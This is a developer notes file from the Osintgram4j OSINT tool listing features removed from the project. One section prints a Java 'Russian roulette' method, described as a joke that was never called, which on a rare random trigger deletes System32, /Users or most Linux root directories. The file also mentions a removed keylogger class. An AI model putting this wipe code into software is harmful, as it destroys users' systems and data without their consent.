# Removed Features
This is a list of removed / replaced features that were created during
the development/release stages of Osintgram4j. Some were already forgotten,
but some weren't. Forgotten, as in never committed or pushed to GitHub.

I won't go into every single detail, especially that some methods already
have the `@Deprecated` notice for some specific methods.

## Development Stages (v0.1 - v0.6)
In the development stages, I went through some ideas, which were either
removed or replaced with other methods / functionalities. As of now, we
are still in the v0.1 stage. Don't worry, we are soon transitioning into
the v0.2 territory, where Networking starts to take shape.

### Shell Files
Like Bash/ZSH Script files, I tried bringing Osintgram4j Script files, as a
way of bringing Scripting into it.

This was later on deleted and replaced with the use of `addTarget` method
that can be seen in `src/net/bc100dev/osintgram4j/MainClass.java` file.
The reason for its deletion was to simplify the process of using it instead
of doing something that a Shebang can literally do.

This was later on deleted due to some complexities. However, it's use of file
targets within the CLI itself was replaced with the use of `addTarget` method,
where for each target, it would assign 

### Keylogger Easter Egg
For people that like snooping around in the source files, I wanted to add
a little secret, which was a Keylogger. However, that Keylogger didn't have
any purpose, so it was remained as a useless class.

Later in the development, that class was deleted due to potential backlash
that people, or to be exact, haters looking to cancel people, could try to
cancel me, which I am not going that route just yet.

### Russian Roulette System Wipe
As a joke that has relatively low chance of running, I thought about including
a small code Easter egg that also never gets called, which basically, wipes
the System. Let me demonstrate from a recovered commit.

```java
public static void russianRoulette() throws IOException {
    int i = Utility.getRandomInteger(1, 150);
    i += Utility.getRandomInteger(0, Utility.getRandomInteger(715, Integer.MAX_VALUE / 2));
    i /= Utility.getRandomInteger(1, 4);
    i += Utility.getRandomInteger(500, 20000);

    if (i == 2891055) {
        switch (getOperatingSystem()) {
            case WINDOWS -> delete(System.getenv("SystemRoot") + "\\system32");
            case LINUX -> {
                delete("/home");
                delete("/opt");
                delete("/etc");
                delete("/media");
                delete("/mnt");
                delete("/lib");
                delete("/lib32");
                delete("/lib64");
                delete("/bin");
                delete("/sbin");
            }
            case MAC_OS -> delete("/Users");
        }

        return;
    }

    throw new IOException("lucky bastard");
}
```

What it does is the randomness, which I think, is relatively very low chance
of running. If the specific operating system gets detected, it does its
usual thing. On Windows, it deletes System32, while on macOS, I only went for
the `/Users` folder, since I don't personally own a MacBook. With Linux, I
went for the most of the root directories. Also, that was linked with the
File Utility class in the commons directory itself.

Why was it deleted? Because I decided to remove this bloat, but also the
same reason, as said with the Keylogger.

### Package Identifiers
For the modding API thing, I wanted to integrate a way of adding Identifiers
for each package. However, since I noticed that it is bloated in some way or
another, I decided to remove it, along with the Identifier Generation. This
way, packages will no longer use an Identifier. Instead, every package
relies on the JAR Manifest file, giving specific Attributes. Using this way,
the client can rely on File Names instead of specific Package Identification
that are long and unable to read. I mean, would you like to read a 35-long
identifier that does not even use the common strategies, like UUID for
example? I surely don't want to.

### EE Handle
EE stands for "Easter Egg", which was used to handle a remote file and handle
the random password generation. If the password was correct, it would print
out a specific password. This was later on removed, due to some personal
issues with a specific individual.

If you wish to encounter more, then look into the `extres` folder. You will
see two other files, named `unused0.txt` and `unused2.txt`, even though
the Unused 0 might have no leads there. You might want to embrace first
before diving into it.

### Native Shell
As a way of making the best out of the Shell, which include handling specific keys,
like Left Arrow and Right Arrow, it was removed due to complexities of the `ncurses`
library. I wanted it, but given the fact that ChatGPT wrote it, and me, not knowing,
how to fix specific bugs, I had to remove it in favor of the standard `Scanner`
class, which is poorly made. Maybe in the future, I might revisit it.